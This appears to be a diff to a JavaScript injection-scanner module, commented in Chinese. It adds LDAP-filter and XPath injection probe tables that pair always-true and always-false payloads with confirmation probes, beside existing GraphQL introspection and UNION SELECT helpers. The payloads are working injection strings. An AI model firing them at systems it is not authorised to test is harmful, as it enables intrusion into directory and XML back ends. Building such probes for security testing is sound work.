@@ -561,6 +561,37 @@ export const GRAPHQL_PROBES = [
   { name: '循环查询', query: 'query { __schema { types { name fields { name } } } }', sig: /__schema|types/ },
 ];
 
+// ==================== LDAP / XPath 注入探测表（[D203] 对标 sqlmap 1.10 --ldap / --xpath） ====================
+// 与 NoSQL 通道同构：真/假条件对 + 二次确认，命中才报；**不做「报错签名即漏洞」的弱判据**
+// （解析错误只说明后端吃了非法语法，不说明攻击者能控制查询语义）。
+// primary 与 confirm 各自只差「恒真 vs 恒假」取值、其余字符完全一致，
+// 保证差异来自后端解释注入条件，而不是 payload 长度/字符噪声。
+export const LDAP_FILTER_PROBES = [
+  {
+    name: 'objectClass 过滤器闭合', cost: 1,
+    primary: { true: '*)(|(objectClass=*))', false: '*)(|(objectClass=__sqli_no_such_class__))' },
+    confirm: { true: '*)(|(uid=*))', false: '*)(|(uid=__sqli_no_such_uid__))' },
+  },
+  {
+    name: '通配符否定', cost: 2,
+    primary: { true: '*)(!(uid=__sqli_no_such_uid__))', false: '*)(uid=__sqli_no_such_uid__)' },
+    confirm: { true: '*)(!(cn=__sqli_no_such_cn__))', false: '*)(cn=__sqli_no_such_cn__)' },
+  },
+];
+
+export const XPATH_PROBES = [
+  {
+    name: '字符串闭合 or 恒真/恒假', cost: 1,
+    primary: { true: "' or '1'='1", false: "' or '1'='2" },
+    confirm: { true: "' or 1=1 or 'a'='", false: "' or 1=2 or 'a'='" },
+  },
+  {
+    name: '节点轴 union', cost: 2,
+    primary: { true: "'] | //*[1=1", false: "'] | //*[1=2" },
+    confirm: { true: "'] | //*[2>1", false: "'] | //*[2<1" },
+  },
+];
+
 // 生成 N 个 NULL 占位（UNION SELECT 中非回显列填空，回显列由 WRAP 包裹结果替换）
 // 非正数时至少返回 1 个 NULL，避免生成空序列导致 UNION 列数错配。
 export function nullSequence(columns) {
